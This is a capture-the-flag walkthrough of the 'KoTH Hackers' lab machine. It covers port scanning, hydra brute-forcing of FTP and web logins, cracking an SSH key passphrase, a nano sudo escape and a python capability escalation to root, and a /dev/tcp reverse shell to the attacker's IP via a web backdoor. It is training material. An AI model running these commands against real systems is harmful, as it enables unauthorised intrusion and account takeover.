KoTH Hackers

Target IP: 10.10.110.244
Challenge Description:

Capture the flags. Defend Ellingson Mineral. This is a standalone room for one of the King of the Hill machines, Hackers.

Reconnaissance


Performing a TCP port scan using the command sudo nmap -sS 10.10.110.244 -p- returns the result shown above. There are four TCP ports open on the target machine: FTP, SSH, HTTP, and another application on the higher port of 9999. Time to perform an aggressive TCP port scan against the open ports to identify its applications and services.

I performed an aggressive TCP port scan against the four TCP ports using the command sudo nmap -sV -A 10.10.110.244 -p 21,22,80,9999 and obtained the result showna above. The FTP application on port 21 looks interesting as it supports anonymous login and there is a file with the name note. SSH is also open on the target machine, however I do not have any credentials yet. The target machine seems to be running a web server on port 80 using Golang with the website name as Ellingson Mineral Company. The application on the higher port 9999 is also interesting. I will enumerate the FTP first and make my way down.

Enumeration

Port 21: FTP

I connected to the FTP application on the target machine by running the command ftp 10.10.110.244 as anonymous. Then I obtained the directory listing using the command ls -la and obtained two entries: .flag and note, as shown above. I downloaded both files to my machine using the get command. I am assuming .flag is the first flag.


I checked the content of the file note using cat and obtained the information shown above. The note above mentions a small number of weak passwords the possible users are using. I also obtained two usernames, rcampbell and gcrawford, that could possibly still be active. There is also another name Eugene Belford. This user's username could be ebelford due to the style the other usernames are using.


I created two files with the entries shown above. These are the possible usernames and passwords. I sprayed these credentials against the FTP application, but I had no luck. Since the note mentions the two users are using weak passwords -- can I use the passwords from rockyou.txt?


I ran the command hydra -L usernames -P /usr/share/wordlists/rockyou.txt 10.10.110.244 ftp and got a hit. I managed to successfully bruteforce the password deedee of the user rcampbell, as shown above. However, the other usernames were taking long.


Using the new credentials rcampbell:deedee, I managed to gain access to the FTP application. This user has the new flag called .flag, as shown above. However, I did not find anything else useful. I managed to SSH into the target machine using this same credentials, but I did not find anything either again. I still have to check if I can bruteforce the password of the user gcrawford.


And bingo! I managed to bruteforce the FTP password jaylene of the user gcrawford using the command hydra -l gcrawford -P /usr/share/wordlists/rockyou.txt 10.10.110.244 ftp, as shown above.This bruteforce attempt was successful.


I successfully connected to the FTP application using the credentials gcrawford:jaylene and identified two information: SSH directory belonging to the user gcrawford and a text file with the name business.txt, as shown above. Can I obtain the SSH key of this user?


I browsed to the .ssh directory using cd. And then using the get command, I transferred the SSH key id_rsa and business.txt to my machine, as shown above. I am expecting the SSH key to ask for the passphrase, as mentioned in the note. This user is known for exposing their crypto keys.


After transferring the SSH key to my machine, I ran the command ssh2john id_rsa > hash to obtain the hash of the SSH key. Then using the command john hash --wordlist=/usr/share/wordlists/rockyou.txt, I managed to bruteforce the passphrase sprite1 belonging to the user gcrawford as shown above. Now I can SSH into the target machine as this new user.

Port 80: HTTP

I ran a scan against the web application using the command nikto -h http://10.10.110.244 and obtained the result shown above. This scan successfully identified interesting directories such as /backdoor/, /staff/, etc.


I browsed to the HTTP application and the webpage above was displayed to me. There are four navigation buttons. I viewed the source-code of the webpage and I found developer comments. But nothing stood out to me. Time to perform a directory search.


I performed a directory search using the command gobuster dir -u http://10.10.110.244/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x html,php,txt and obtained the interesting entries above. Again, the /backdoor/ is found. Is this a login page?

I successfully managed to root the target machine via the SSH key vector. I added a small section on exploiting the web application at the end of this CTF.

Exploitation


I gained a foothold on the target machine by using the SSH key belonging to the user gcrawford and the passphrase sprite1. Firstly I ran the command chmod 200 id_rsa to make the SSH key private. Then I used the command ssh gcrawford@10.10.110.244 -i id_rsa to gain a foothold.

Privilege Escalation

First PE Vector: Sudo Privileges Weakness

I ran the command sudo -l. When it asked for the password of the user, I used jaylene and obtained the result shown above. The user gcrawford can execute the command sudo /bin/nano /home/gcrawford/business.txt with root privileges. This means the file business.txt can be edited with root privileges. And while editing this file with root privileges, I can break out of it to spawn a root shell by using the following commands:

^R^X
reset; sh 1>&0 2>&0
^R^X
reset; sh 1>&0 2>&0


And bingo! Now I have a root shell on the target machine. Firstly, I ran the command sudo /bin/nano /home/gcrawford/business.txt to edit the file with root privileges. Then I pressed SHIFT+R and then SHIFT+X to open the command mode. And finally, I entered the command reset; sh 1>&0 2>&0 to spawn a root shell.

Second PE Vector: Capabilities Vulnerabililty

Running the command getcap -r / 2>/dev/null shows the interesting entry above. Apparently the binary /usr/bin/python3.6 has capabilities set.


The second vector to spawn a root shell on the target machine is by executing the command /usr/bin/python3.6 -c 'import os; os.setuid(0); os.system("/bin/sh")' as shown above.

Flags


The first flag is shown above. This flag is obtainable via the FTP on port 21.


The second flag is shown above. This flag is located at main.css of the website.


The third flag is shown above. I obtained this flag after bruteforcing the password of the user rcampbell and using the same credentials to SSH into the target machine.


The fourth flag is shown above. This flag is obtainable after bruteforcing the password of the user gcrawford for the FTP application, and then connecting to the SSH application with the same credentials.


The fifth flag is the root flag, as shown above.


The two flags, sixth and seventh, are located at /home/tryhackme/.flag and /home/production/.flag. They are shown above. I am sure there are more flags. I noticed a binary with the name koth. Maybe decompiling this executable file contains another flag? Or what about login webpage over at /backdoor? Well these are all the flags I found.

Exploiting the Web Application and Spawning a Root Shell


I browsed to http://10.10.110.244/backdoor/ and the login webpage above was displayed to me. Can I spray the credentials here? How does the web application work? Can I reverse-engineer it? From scanning the code of the webpage at /staff, I identified the dev comment: <!-- I don't get why they won't let me put "plague" here to scare off the skiddies... -->. Is plague a possible username? I added this username inside my username text file. Time to attempt to bruteforce the login.


I viewed the JavaScript code of the webpage /backdoor and obtained the code shown above. I notice the web application redirects me to /backdoor/shell page if the login is successful. Also, the API call is being sent to /api/login. Time to put the possible credentials to test.


I tried to bruteforce the login webpage using all the different usernames, but this was taking forever. To overcome this, I attempted to bruteforce the only user plague using the command hydra -l plague -P /usr/share/wordlists/rockyou.txt 10.10.110.244 http-post-form "/api/login:username=^USER^&password=^PASS^:Incorrect". And I successfully managed to bruteforce the credentials plague:sexy24.


After logging in successfully, I gained access to the /backdoor application as shown above. I can use this application to perform command execution. Obtaining a shell is possible by RCE. I started a listener on my machine at port 8443. Then I deployed the command /bin/sh -i >& /dev/tcp/10.14.55.153/8443 0>&1 at the /backdoor application and got a hit as shown above. Now I have a foothold on the target machine as the user production. I upgraded my shell to an interactive Python tty shell using the command python3 -c 'import pty; pty.spawn("/bin/bash");'.


Running the command getcap -r / 2>/dev/null shows the binary /usr/bin/python3.6 has capabilities set.


And obtaining a root shell is as simple as executing the command /usr/bin/python3.6 -c 'import os; os.setuid(0); os.system("/bin/sh")', as shown above. GG.
